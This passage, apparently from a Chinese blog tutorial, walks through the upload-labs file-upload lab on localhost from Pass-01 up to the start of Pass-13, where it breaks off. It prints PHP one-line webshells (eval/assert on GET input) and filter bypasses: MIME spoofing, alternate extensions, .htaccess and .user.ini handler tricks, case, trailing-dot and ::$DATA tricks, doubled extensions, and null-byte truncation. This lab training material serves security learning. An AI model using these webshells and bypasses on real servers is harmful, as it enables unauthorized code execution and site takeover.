+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957656.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入网址和我们一句话木马里的密码“key”</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957627.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试连接</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957893.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功控制，双击打开我们刚刚打开的网站</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957789.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后右键打开终端</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957189.png" srcset="/img/loading.gif" lazyload></p>
+<p>随便输入试试，例如用ipconfig查一下ip</p>
+<p>显示了，说明我们可以操纵系统</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958372.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们试试第二个绕过方法，删除浏览器事件</p>
+<p>查看前端代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957176.png" srcset="/img/loading.gif" lazyload></p>
+<p>很明显，上面代码就是过滤代码，我们这里把除过滤代码之外的代码复制一遍，放到.txt文件里，不要把过滤代码也复制了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958544.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后在在上面添加一段action，地址是要将图片上传到哪的地址，我们在这加上来（如果不知道这个地址是什么，就回到正常的上传页面，然后随便上传一个图片，在F12开发者工具的”网络”模块中可以找到）</p>
+<p>修改成上传地址</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">action=<span class="hljs-string">&quot;http://localhost/upload-labs/Pass-01/index.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958027.png" srcset="/img/loading.gif" lazyload></p>
+<p>将后缀改为html</p>
+<p>然后用浏览器打开这个html文件，直接进行上传操作即可。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958115.png" srcset="/img/loading.gif" lazyload></p>
+<p>我这里又重新写了一个一句话木马，用GET型传参</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958737.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958410.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958688.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问webshell_get.php并且给‘function’和‘key’赋值，我们这次写的一句话木马是get传参形式的，</p>
+<p><strong>eval函数在动态传参时，php的底层认为eval不是函数，所以我们用不了</strong></p>
+<p><strong>但是assert函数在php底层却是以函数执行的，那么第一个参数我们就用assert</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell_get.php?function=assert&amp;key=phpinfo();</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958631.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958846.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，我们可以改一改一句话木马，可以解决动态传参时eval失效的问题，而且只需要传一个参数，但是上面那种方法也要会。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958762.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell_get.php?key=phpinfo();</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958045.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意右上角有显示源码、查看提示、清空上传文件。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958742.png" srcset="/img/loading.gif" lazyload></p>
+<p>完成这一关我们别忘了清空上传文件，不清除的话，这一关的一句话木马还在里面，不能确定后面关卡上传的是否成功，</p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>为了方便，我们将一句话木马改写为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这样不需要传参，直接访问就可以判断是否成功。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959793.png" srcset="/img/loading.gif" lazyload></p>
+<p>先上传一个试试</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959644.png" srcset="/img/loading.gif" lazyload></p>
+<p>失败了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959046.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看提示（大家要记住这个MIME检查，后面还会有）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959574.png" srcset="/img/loading.gif" lazyload></p>
+<p>用BurpSuite抓包看一下</p>
+<p>我们可以看到我们的文件类型是application&#x2F;octet-stream（二进制数据类型）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959488.png" srcset="/img/loading.gif" lazyload></p>
+<p>补充：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+<th>典型示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>text</td>
+<td>表明文件是普通文本，理论上是人类可读</td>
+<td>text&#x2F;plain, text&#x2F;html, text&#x2F;css, text&#x2F;javascript</td>
+</tr>
+<tr>
+<td>image</td>
+<td>表明是某种图像。不包括视频，但是动态图（比如动态 gif）也使用 image 类型</td>
+<td>image&#x2F;gif, image&#x2F;png, image&#x2F;jpeg, image&#x2F;bmp, image&#x2F;webp, image&#x2F;x-icon, image&#x2F;vnd.microsoft.icon</td>
+</tr>
+<tr>
+<td>audio</td>
+<td>表明是某种音频文件</td>
+<td>audio&#x2F;midi, audio&#x2F;mpeg, audio&#x2F;webm, audio&#x2F;ogg, audio&#x2F;wav</td>
+</tr>
+<tr>
+<td>video</td>
+<td>表明是某种视频文件</td>
+<td>video&#x2F;webm, video&#x2F;ogg</td>
+</tr>
+<tr>
+<td>application</td>
+<td>表明是某种二进制数据</td>
+<td>application&#x2F;octet-stream, application&#x2F;pkcs12, application&#x2F;vnd.mspowerpoint, application&#x2F;xhtml+xml, application&#x2F;xml, application&#x2F;pdf</td>
+</tr>
+</tbody></table>
+<p>既然它提示我们的是上传的数据类型不对，那么后端大概率检测的是我们上传文件的文件类型，那么我们在抓包这块将文件类型改为img的文件类型，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">image/jpeg<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004286.png" srcset="/img/loading.gif" lazyload></p>
+<p>注入成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959423.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959197.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>直接上传</p>
+<p>不允许上传.asp,.aspx,.php,.jsp后缀文件！  </p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959098.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看源码发现是黑名单验证，禁止上传这四种后缀的文件</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959045.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是这里黑名单规则不严谨，在某些特定环境中某些特殊后缀不会被过滤且仍会被当作php文件解析。</p>
+<p>常用过滤后缀：<code>php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml</code>。</p>
+<p>下面我们详细讲解一下。</p>
+<p>PHP是一种广泛使用的开放源代码的服务器端脚本语言，主要用于Web开发。默认情况下，PHP文件具有.php扩展名，但是服务器可以被配置为接受其他文件扩展名作为PHP文件来处理。以下是一些可能被服务器配置为识别并解析为PHP脚本的文件扩展名：</p>
+<p>1. <strong>.php</strong> - 这是最常见的PHP文件扩展名。</p>
+<p>2. <strong>.php3</strong> - 早期的PHP版本使用的扩展名。</p>
+<p>3. <strong>.php4</strong> - 用于PHP 4.x系列。</p>
+<p>4. <strong>.php5</strong> - 用于PHP 5.x系列。</p>
+<p>5. <strong>.php7</strong> - 用于PHP 7.x系列。</p>
+<p>6. <strong>.php8</strong> - 用于PHP 8.x系列。</p>
+<p>7. <strong>.phtml</strong> - 这是PHP混合HTML文件使用的另一个旧扩展名。</p>
+<p>8. <strong>.phps</strong> - 用来显示源代码的高亮显示而不是执行它。</p>
+<p>9. <strong>.html or .htm</strong> - 有时服务器被配置为执行嵌入在HTML文件中的PHP代码。</p>
+<p>10. <strong>.inc</strong> - 有时用于包含文件，但这不是一个安全做法，因为它可能会暴露敏感代码。</p>
+<p>关于配置：</p>
+<p>服务器需要通过修改配置文件来支持上述其他扩展名。对于Apache服务器，这通常在<code>.htaccess</code>文件中或者直接在主配置文件<code>httpd.conf</code>中，使用<code>AddType</code>和<code>AddHandler</code>指令来完成。对于Nginx服务器，可以在<code>nginx.conf</code>中通过设置<code>location</code>块并使用<code>fastcgi_pass</code>指令来处理。</p>
+<p>在Apache HTTP 服务器的配置中，<code>AddType</code> 指令用于将特定的 MIME 类型与文件扩展名相关联。</p>
+<p>注意有一些使用最新phpstudy搭建的upload-labs这一关可能不成功，下述方法适用于作者上文写的环境配置。</p>
+<p>这里先修改phpstudy的配置文件，打开phpstudy的httpd-conf配置文件</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959103.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改 <code>AddType application/x-httpd-php .php .phtml</code> 为 <code>AddType application/x-httpd-php .php .phtml .php5</code>（自己想用啥就加啥，想用.php4就加.php4，我们这里以.php5为例），也可以多加几个，例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .php .php3 .php4 .php5 .php6 .php7 .php8 .phtml<br></code></pre></td></tr></table></figure>
+
+<p>修改完别忘了保存</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959684.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意<code>AddType application/x-httpd-php .php .phtml</code>前面有可能有#，如果有也要删除。</p>
+<p>然后重新启动phpstudy</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959602.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们这里用.php5试一下，直接上传一个名为webshell.php5的文件，可以发现直接上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959524.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问试试，发现不好使，看了看，原来是名字改了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959137.png" srcset="/img/loading.gif" lazyload></p>
+<p>再次访问，成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959731.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>发现黑名单比第三关多了很多，基本将我们的后缀都过滤掉了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000334.png" srcset="/img/loading.gif" lazyload></p>
+<p>该怎么进行绕过呢</p>
+<p>这时候补充一个知识点：</p>
+<p>.htaccess文件解析漏洞。</p>
+<p>常见配法有以下几种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">AddHandler php5-script .jpg<br> <br>    <br> <br>AddType application/x-httpd-php .jpg<br> <br>    <br> <br>Sethandler application/x-httpd-php<br></code></pre></td></tr></table></figure>
+
+<p>Sethandler 将该目录及子目录的所有文件均映射为php文件类型。</p>
+<p>Addhandler 使用 php5-script 处理器来解析所匹配到的文件。</p>
+<p>AddType 将特定扩展名文件映射为php文件类型。</p>
+<p>简单来说就是，可以将我们所的文件都解析成php或者是特定的文件解析为php。</p>
+<p>那么我们创建一个.htaccess文件</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000641.png" srcset="/img/loading.gif" lazyload></p>
+<p>写上内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Sethandler application/x-httpd-php<br></code></pre></td></tr></table></figure>
+
+<p>这是将本目录及所有子目录的所有文件都解析为php文件。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000720.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后把我们的webshell.php改为1.jpg</p>
+<p>我们先上传这个1.jpg文件，然后上传这个.htaccess，再访问1.jpg</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000023.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>这关多过滤了个.htaccess，看看提示</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000391.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以用.user.ini去包含我们的代码，然后执行，.user.ini相当于一个用户自定义的php.ini。</p>
+<p>user.ini ：自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用.htaccess文件有同样效果。</p>
+<p>除了主php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI设置可被识别。</p>
+<p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>
+<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>
+<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+<p>这关是关卡制作者最后加上的，所以这里最麻烦是要用PHP 5.3.0及其以后的版本，和我们配置的环境不一样。这里又要用上我们下载的21关压缩包，作者是把它解压缩在新版phpstudy里，然后用的php7（大家也可以在旧版phpstudy里换php版本）。</p>
+<p>这里别忘了把php.ini中的user_ini.cache_ttl修改一下，要不然间隔时间太长了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005015.png" srcset="/img/loading.gif" lazyload></p>
+<p>先把上一关做的1.jpg上传</p>
+<p>然后制作一个.user.ini文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=<span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure>
+
+<p>.user.ini文件里的意思是：所有的php文件都自动包含我们刚刚上传的1.jpg文件，会将其执行。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000611.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后上传.user.ini文件</p>
+<p>我们已经要求php文件都自动包含我们刚刚上传的1.jpg文件，而1.jpg中有我们的一句话木马，也就是文件夹内所有的php都会包含我们的一句话木马。</p>
+<p>接下来要做就是找个php文件访问，去执行我们的一句话木马。</p>
+<p>这里我们并不能上传php文件，该怎么办呢？</p>
+<p>不要忘了，upload文件夹里面一直有个readme.php，这时候它就派上用场了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000504.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问一下它</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/readme.php</span><br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000150.png" srcset="/img/loading.gif" lazyload></p>
+<p>关掉新版本的phpstudy，打开我们的旧环境，下面题目还是用旧环境</p>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>比较前面的源码可以发现，这关的源码没有把字符强制转换为小写的语句：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000098.png" srcset="/img/loading.gif" lazyload></p>
+<p>在这行代码中，strtolower函数被用于将变量$file_ext所包含的字符串转化为全小写。</p>
+<p>所以，这道题是可以直接通过修改文件名为大写来绕过限制的。</p>
+<p>所以我们上传一个1.PHP。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000839.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000664.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问一下，发现失败了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005113.png" srcset="/img/loading.gif" lazyload></p>
+<p>原来是把文件名改了，再次访问，成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000260.png" srcset="/img/loading.gif" lazyload></p>
+<p>这题就是服务器没有对上传文件的名称大小写进行限制，从而导致大小写绕过漏洞，攻击者可以通过替换文件名为大写绕过对.php的限制上传恶意代码。</p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>查看源码，发现这题没有对文件后缀名进行首尾去空的操作。</p>
+<p>第四关中对文件后缀进行首尾去空的代码为（“&#x2F;&#x2F;首尾去空“，字打错了）：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000410.png" srcset="/img/loading.gif" lazyload></p>
+<p>这一行代码使用了PHP的trim函数对变量$file_ext所存储的字符串进行处理。trim函数的作用是去除字符串首尾的空白字符（包括空格、换行符、制表符等）</p>
+<p>所以这里可以通过对文件后缀名末尾进行添加空格的方式来进行绕过。</p>
+<p>因为Windows特性，在文件资源管理器中对后缀名添加空格的操作是不允许的，所以这里我们依旧需要使用Burpsuite抓包修改。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000325.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000833.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传之后文件被改名了，访问时注意一下</p>
+<p>访问成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000620.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>还是看源码</p>
+<p>可以看到这一关他确实把去除空格加上了，但是你仔细看，他是不是没有deldot()这个函数了（deldot()函数可以去除文件名末尾的点）。但上面说过，windows环境时会自动去除文件末尾的点和空格的，所以还是bp抓包</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000509.png" srcset="/img/loading.gif" lazyload></p>
+<p>很明显，上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000701.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问一下试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure>
+
+<p>成功了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000866.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>废话不说，源码分析：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000121.png" srcset="/img/loading.gif" lazyload></p>
+<p>和之前的对比一下，发现少了下面这行代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001738.png" srcset="/img/loading.gif" lazyload></p>
+<p>这关的过滤相较于上一关又少了一个过滤(::$DATA)的字符串</p>
+<p><strong>解释：在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉</strong></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001957.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001355.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传的文件依然改了名</p>
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001257.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>还是看源码</p>
+<p>可以看到，结合上面几个的过滤，转小写、空格、点、.htaccess、::$DATA都给我们防住了</p>
+<p>那这时候该怎么办呢？</p>
+<p>代码是死的，人是活的。每过一句代码，只执行一次，那我们就在文件末尾多加几个空格、点之类了，反正也就每执行一次只取出一个。</p>
+<p>那我们直接末尾混合着多加几个</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001974.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001886.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001386.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>看源码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001123.png" srcset="/img/loading.gif" lazyload></p>
+<p>这一关明显不一样了，让我们来看看哪有洞</p>
+<p>他在str_ireplace()函数这将我们的危险后缀都替换为空了，这该咋办。</p>
+<p>还是那句话，代码死的，人是活的。他也就执行一次，那我们进行双写试试</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001004.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001327.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001699.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>看源码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001697.png" srcset="/img/loading.gif" lazyload></p>
+<p>save_path是一个可控的变量，后面还有一个后缀名需要绕过，这个时候需要使用%00截断，不过这个东西已经是旧时代的产物的，所以有使用条件</p>
+<p>1、php版本小于5.3.4</p>
+<p>2、php的magic_quotes_gpc为OFF状态</p>
+<p>这里的官方环境满足上两点，不需要我们去操作。</p>
+<p>【00截断原理】</p>
+<p>    谈到00截断我们都会想到，有什么0x00截断、%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：</p>
+<p>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）。</p>
+<p>char(0)是什么东西？</p>
+<p>    chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p>
+<p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符</p>
+<p>而截断的关键就是这个空字符，<strong>当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</strong></p>
+<p>参考文献：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44840696/article/details/90581104" title="文件上传绕过之00截断_00截断绕过-CSDN博客">文件上传绕过之00截断_00截断绕过-CSDN博客</a></p>
+<p>解释完后，我们就要开始想办法怎么利用这个00截断来进行绕过，我们可以看到img_path是通过get传参传递的，那么我们不妨在这块将路径改掉，改为upload&#x2F;web.php%00。那么后面不管是什么东西都会被截断掉，然后经过move_uploaded_file函数将临时文件重新复制给我们的截断之前的文件路径。</p>
+<p>当然，我们还是要上传我们地jpg文件的，使得我们可以进行下面程序的运行。</p>
+<p>所以我们这里还是上传我们之前做的1.jpg。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001561.png" srcset="/img/loading.gif" lazyload></p>
+<p>抓包修改</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">upload/webshell.php%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001190.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意访问的是我们上面写的webshell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001497.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>查看源代码，和第十一关对比，发现接受值变成了post，那么思路就和第十一关一样，不过post方式不会自行编码，所以得换一种方式。</p>
+<p>在这一关我们就需要现在web.php后面加一个占位符（随便写个字符，能找到就行），然后将占位符得16进制改为00，这样空字节00就出现了，最后在移动文件的时候就会触发\00截断。</p>
+<p>还是上传1.jpg。</p>
+<p>写占位符（作者这里随便写了个0）</p>
